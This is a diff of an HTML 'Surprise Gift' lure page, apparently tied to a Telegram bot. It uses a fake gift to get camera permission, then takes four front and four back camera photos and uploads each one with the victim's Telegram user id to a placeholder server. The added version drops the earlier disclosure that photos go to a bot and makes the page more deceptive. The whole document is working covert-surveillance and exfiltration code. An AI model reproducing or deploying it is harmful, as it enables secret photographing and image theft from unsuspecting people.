@@ -1,148 +1,165 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
 <title>🎁 Surprise Gift</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
-body {
-  margin: 0;
-  background: linear-gradient(135deg,#1a002b,#000);
-  font-family: Arial, sans-serif;
-  color: #fff;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
+body{
+  margin:0;background:#0b0014;color:white;
+  font-family:sans-serif;display:flex;
+  align-items:center;justify-content:center;height:100vh;
+  overflow:hidden
 }
-
-.box {
-  background: rgba(0,0,0,.8);
-  border-radius: 20px;
-  padding: 25px;
-  max-width: 350px;
-  width: 90%;
-  text-align: center;
-  box-shadow: 0 0 25px #ff00ff;
+.card{
+  background:#160022;padding:22px;
+  border-radius:20px;width:90%;max-width:380px;
+  box-shadow:0 0 25px #ff00ff;text-align:center
 }
-
-button {
-  background: linear-gradient(90deg,#ff00ff,#ff66ff);
-  border: none;
-  border-radius: 30px;
-  padding: 14px 25px;
-  font-size: 16px;
-  color: #000;
-  cursor: pointer;
-  margin-top: 15px;
+button{
+  width:100%;padding:12px;margin-top:10px;
+  border-radius:30px;border:none;
+  background:#ff00ff;color:black;font-size:16px
 }
-
-#video {
-  width: 100%;
-  border-radius: 15px;
-  display: none;
-  margin-top: 15px;
+video{width:100%;border-radius:12px;margin-top:10px;display:none}
+img{width:100%;margin-top:6px;border-radius:10px}
+.heart{
+  position:fixed;bottom:-20px;font-size:22px;
+  animation:float 5s linear infinite;color:pink
 }
-
-.status {
-  margin-top: 10px;
-  font-size: 14px;
-  color: #ccc;
+@keyframes float{
+  0%{transform:translateY(0);opacity:1}
+  100%{transform:translateY(-120vh);opacity:0}
+}
+.status{
+  margin-top:10px;font-size:14px;color:#ffb3ff;
 }
 </style>
 </head>
 
 <body>
-<div class="box">
-  <h2>🎁 Unlock Your Surprise</h2>
-  <p>We need camera permission.<br>
-  <b>8 photos (4 front + 4 back)</b><br>
-  will be sent to you and the bot.</p>
+<div class="card" id="box">
+  <h2>🎁 Surprise Gift</h2>
+  <p id="text">
+    You have a surprise! 🧧🎁<br><br>
+    After you unlock, this page will access your camera to create a special surprise for you.
+  </p>
 
-  <button onclick="start()">🔓 Allow & Continue</button>
-
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" hidden></canvas>
-
+  <button id="unlockBtn">🔓 Unlock Gift</button>
   <div class="status" id="status"></div>
 </div>
 
 <script>
-const BOT_TOKEN = "YOUR_BOT_TOKEN";
-const CHAT_ID = "YOUR_CHAT_ID";
+const box = document.getElementById("box");
+const statusEl = document.getElementById("status");
+let stream, video;
 
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const status = document.getElementById("status");
-const ctx = canvas.getContext("2d");
+// hearts animation
+setInterval(()=>{
+  let h=document.createElement("div");
+  h.className="heart";h.innerText="💖";
+  h.style.left=Math.random()*100+"vw";
+  document.body.appendChild(h);
+  setTimeout(()=>h.remove(),5000);
+},400);
 
-let stream;
-let photos = [];
+// get uid from query (?uid=123456)
+function getUserIdFromQuery() {
+  const params = new URLSearchParams(window.location.search);
+  return params.get("uid");
+}
+const USER_ID = getUserIdFromQuery(); // Telegram user id passed from bot
 
-async function openCamera(mode) {
+document.getElementById("unlockBtn").onclick = () => {
+  startGift();
+};
+
+async function startGift() {
+  box.innerHTML = `
+    <h2>🎬 Creating Your Surprise</h2>
+    <p id="info">
+      Please wait while we create your special surprise!
+    </p>
+    <video id="video" autoplay playsinline></video>
+    <div class="status" id="status2">Getting ready…</div>
+    <div id="preview"></div>
+  `;
+
+  const info = document.getElementById("info");
+  const status2 = document.getElementById("status2");
+  const preview = document.getElementById("preview");
+  video = document.getElementById("video");
+
+  try {
+    // FRONT camera first
+    status2.textContent = "Setting up camera…";
+    await startCam("user");
+    await captureMultiple(4, "Front", preview, status2);
+
+    // BACK camera next
+    status2.textContent = "Switching camera…";
+    await startCam("environment");
+    await captureMultiple(4, "Back", preview, status2);
+
+    status2.textContent = "✅ Your surprise is ready!";
+  } catch (err) {
+    console.error(err);
+    status2.textContent = "❌ Something went wrong. Please try again.";
+  } finally {
+    if (stream) stream.getTracks().forEach(t => t.stop());
+  }
+}
+
+async function startCam(mode){
   if (stream) stream.getTracks().forEach(t => t.stop());
-
   stream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: mode },
-    audio: false
+    video:{facingMode:mode},
+    audio:false
   });
-
   video.srcObject = stream;
   video.style.display = "block";
-
   await video.play();
-  await new Promise(r => setTimeout(r, 800));
 }
 
-function capture() {
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  ctx.drawImage(video, 0, 0);
-  return canvas.toDataURL("image/jpeg", 0.8);
+// capture N photos with small delay
+async function captureMultiple(count, label, preview, statusEl){
+  for (let i = 1; i <= count; i++) {
+    statusEl.textContent = `Capturing ${label} ${i} of ${count}…`;
+    await new Promise(r => setTimeout(r, 700));
+    await snap(label + " " + i, preview);
+  }
 }
 
-async function send(base64, caption) {
-  const blob = await (await fetch(base64)).blob();
-  const fd = new FormData();
-  fd.append("chat_id", CHAT_ID);
-  fd.append("photo", blob);
-  fd.append("caption", caption);
+async function snap(tag, preview){
+  let c = document.createElement("canvas");
+  c.width = video.videoWidth || 640;
+  c.height = video.videoHeight || 480;
+  c.getContext("2d").drawImage(video, 0, 0, c.width, c.height);
+  let imgData = c.toDataURL("image/jpeg", 0.85);
 
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-    method: "POST",
-    body: fd
+  // show preview
+  let img = document.createElement("img");
+  img.src = imgData;
+  preview.appendChild(img);
+
+  // send to your backend
+  await fetch("http://YOUR_SERVER_IP:5000/upload",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      image: imgData,
+      uid: USER_ID
+    })
   });
 }
 
-async function start() {
-  status.innerText = "📸 Opening front camera...";
-  await openCamera("user");
-
-  for (let i=1;i<=4;i++) {
-    photos.push(capture());
-    status.innerText = `Front photo ${i}/4`;
-    await new Promise(r=>setTimeout(r,700));
+// Clean up
+window.addEventListener('beforeunload', () => {
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
   }
-
-  status.innerText = "🔄 Switching camera...";
-  await openCamera("environment");
-
-  for (let i=1;i<=4;i++) {
-    photos.push(capture());
-    status.innerText = `Back photo ${i}/4`;
-    await new Promise(r=>setTimeout(r,700));
-  }
-
-  stream.getTracks().forEach(t => t.stop());
-  status.innerText = "⬆️ Sending photos...";
-
-  for (let i=0;i<photos.length;i++) {
-    await send(photos[i], `📸 ${i+1}/8`);
-  }
-
-  status.innerText = "✅ Gift unlocked!";
-}
+});
 </script>
 </body>
 </html>
